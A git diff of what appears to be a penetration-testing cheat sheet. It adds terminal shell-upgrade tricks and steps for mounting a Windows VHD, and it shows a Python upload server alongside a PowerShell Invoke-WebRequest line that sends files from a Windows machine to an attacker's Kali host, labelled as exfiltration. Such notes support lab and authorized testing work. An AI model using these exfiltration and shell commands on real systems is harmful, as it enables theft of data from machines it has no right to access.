@@ -80,10 +80,20 @@ perl -e 'exec "/bin/sh";'
     
 ```
 
+Alternatively:
+- `script /dev/null -c bash`
+  - Then background the existing shell with CTRL Z
+- On kali: `stty raw -echo; fg` (to continue the process)
+- Type `reset` then set the terminal type to `screen`
+
+Mount a Windows vhd:
+- `sudo apt install libguestfs-tools`
+- `guestmount --add {vhd_file} --inspector --ro -v /mnt/{dir_to_mount_to}`
+  - `-ro` is readonly
+
 Exfiltrate files off of a Windows system `sudo python3 app.py` (if [updog](https://github.com/sc0tfree/updog) isn't available)
 
-```
-
+```python group:a
 #!/usr/bin/env python3
 from http.server import SimpleHTTPRequestHandler, HTTPServer
 import os
@@ -110,7 +120,10 @@ if __name__ == "__main__":
     httpd = HTTPServer(server_address, FileUploadHTTPRequestHandler)
     print(f"Serving HTTP on {server_address[0]} port {server_address[1]} (http://{server_address[0]}:{server_address[1]}/)")
     httpd.serve_forever()
-    
+```
+```python group:a
+from http.server import SimpleHTTPRequestHandler, HTTPServer
+import os
 ```
 
 `Invoke-WebRequest -Uri "http://{kali_IP}:8080/upload" -Method Post -InFile "{filename}" -Headers @{"filename"="{filename}"} -UseBasicParsing`
